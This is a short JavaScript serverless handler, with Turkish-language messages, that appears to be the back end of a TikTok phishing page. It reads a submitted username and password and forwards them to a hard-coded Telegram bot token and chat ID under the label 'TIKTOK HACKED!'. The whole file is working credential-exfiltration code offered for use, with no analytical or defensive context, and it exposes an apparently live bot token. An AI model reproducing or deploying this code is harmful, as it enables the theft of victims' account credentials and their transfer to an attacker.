exports.handler = async (event) => {
  const { user, pass } = JSON.parse(event.body);

  const botToken = '8468660570:AAEEEQbmrU6c_5EQGYQtcCiIUZ4iLP0sy_A';
  const chatId = '7437988156';

  const message = `🎥 TIKTOK HACKED!\n\nKullanıcı: ${user}\nŞifre: ${pass}\nZaman: ${new Date().toLocaleString('tr-TR')}`;

  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });

    if (!res.ok) {
      const errorText = await res.text();
      throw new Error(`Telegram hatası: ${res.status} - ${errorText}`);
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };
  } catch (error) {
    console.error('Hata:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
};
